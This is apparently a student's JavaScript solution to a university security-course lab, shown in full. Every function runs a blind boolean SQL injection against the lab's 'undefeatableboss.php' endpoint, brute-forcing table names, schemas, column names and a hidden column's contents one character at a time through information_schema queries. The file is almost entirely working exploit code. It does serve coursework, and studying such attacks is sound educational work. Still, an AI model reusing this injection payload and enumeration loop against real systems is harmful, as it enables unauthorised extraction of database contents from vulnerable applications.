async function fetchDataAndCheckWord(url, char, charPos, word) {
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error('Network response was not ok ' + response.statusText);
        }
        const data = await response.text();
        const containsWord = data.includes(word);
        // console.log(`Does the response contain the word "${word}"?`, containsWord);
        if (containsWord) {
            console.log(`Found ${char} at position ${charPos}`);
        }
    } catch (error) {
        console.error('There has been a problem with your fetch operation:', error);
    }
}

function getTableName() {
    for (let j = 0; j < 100; j++) {
      for (let i = 32; i <= 126; i++) {
          const char = String.fromCharCode(i);
          fetchDataAndCheckWord("https://cse484.cs.washington.edu/lab2/jailbreak/undefeatableboss.php?command=fight%27+or+%28select+substr%28table_name%2C"+j+"%2C1%29+from+information_schema.tables+where+table_schema%3D%27lab2%27+group+by+table_name+order+by+table_name+limit+1%2C1%29%3D%27"+char+"%27%29%3B+--+", char, j, "spell");
      }
    }
}

function getTableSchema() {
  for (let j = 0; j < 100; j++) {
    for (let i = 32; i <= 126; i++) {
        const char = String.fromCharCode(i);
        fetchDataAndCheckWord("https://cse484.cs.washington.edu/lab2/jailbreak/undefeatableboss.php?command=fight%27+or+%28select+substr%28table_schema%2C"+j+"%2C1%29+from+information_schema.tables+group+by+table_schema+order+by+table_schema+limit+1%2C1%29%3D%27"+char+"%27%29%3B+--+", char, j, "spell");
    }
  }
}

function getColName() {
  for (let j = 0; j < 100; j++) {
    for (let i = 32; i <= 126; i++) {
        const char = String.fromCharCode(i);
        fetchDataAndCheckWord("https://cse484.cs.washington.edu/lab2/jailbreak/undefeatableboss.php?command=fight%27+or+%28select+substr%28column_name%2C"+j+"%2C1%29+from+information_schema.columns+where+table_name%3D%27sql3-truepower%27+group+by+column_name+order+by+column_name+limit+1%29%3D%27"+char+"%27%29%3B+--+", char, j, "spell");
    }
  }
}

function getCommands() {
  for (let j = 0; j < 100; j++) {
    for (let i = 32; i <= 126; i++) {
        const char = String.fromCharCode(i);
        fetchDataAndCheckWord("https://cse484.cs.washington.edu/lab2/jailbreak/undefeatableboss.php?command=fight%27+or+%28select+substr%28whatyoucanreallydo%2C"+j+"%2C1%29+from+%60sql3-truepower%60+limit+1%29%3D%27"+char+"%27%29%3B+--+", char, j, "spell");
    }
  }
}